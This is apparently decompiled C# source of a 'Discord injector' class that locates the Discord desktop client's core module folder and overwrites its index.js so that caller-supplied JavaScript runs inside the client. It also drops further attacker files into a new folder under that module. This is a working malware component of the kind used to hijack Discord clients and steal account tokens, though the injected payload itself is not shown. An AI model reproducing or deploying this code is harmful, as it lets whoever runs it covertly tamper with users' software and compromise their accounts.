using System;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace yikes
{
	// Token: 0x02000004 RID: 4
	public class OxygenInjector
	{
		// Token: 0x06000006 RID: 6 RVA: 0x0000208C File Offset: 0x0000028C
		public static bool Inject(DiscordBuild build, string dirName, string indexFile, string prependJS, params OxygenFile[] files)
		{
			string path;
			bool flag = !OxygenInjector.TryGetDiscordPath(build, out path);
			bool result;
			if (flag)
			{
				result = false;
			}
			else
			{
				try
				{
					DirectoryInfo epicDir = Directory.CreateDirectory(path + "/" + dirName);
					File.WriteAllText(path + "/index.js", string.Concat(new string[]
					{
						"\n",
						prependJS,
						"\nprocess.env.modDir = '",
						epicDir.FullName.Replace("\\", "\\\\"),
						"'\nrequire(process.env.modDir + '\\\\inject')\nmodule.exports = require('./core.asar');"
					}));
					foreach (OxygenFile file in files)
					{
						File.WriteAllText(epicDir.FullName + "/" + file.Path, file.Contents);
					}
					result = true;
				}
				catch
				{
					result = false;
				}
			}
			return result;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002174 File Offset: 0x00000374
		public static bool TryGetDiscordPath(DiscordBuild build, out string path)
		{
			bool result;
			try
			{
				path = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + OxygenInjector.BuildToString(build)).GetDirectories().First((DirectoryInfo d) => Regex.IsMatch(d.Name, "\\d.\\d.\\d{2}(\\d|$)")).GetDirectories().First((DirectoryInfo d) => d.Name == "modules").GetDirectories().First((DirectoryInfo d) => d.Name == "discord_desktop_core").FullName;
				result = true;
			}
			catch
			{
				path = null;
				result = false;
			}
			return result;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002240 File Offset: 0x00000440
		private static string BuildToString(DiscordBuild build)
		{
			return build.ToString().ToLower();
		}
	}
}
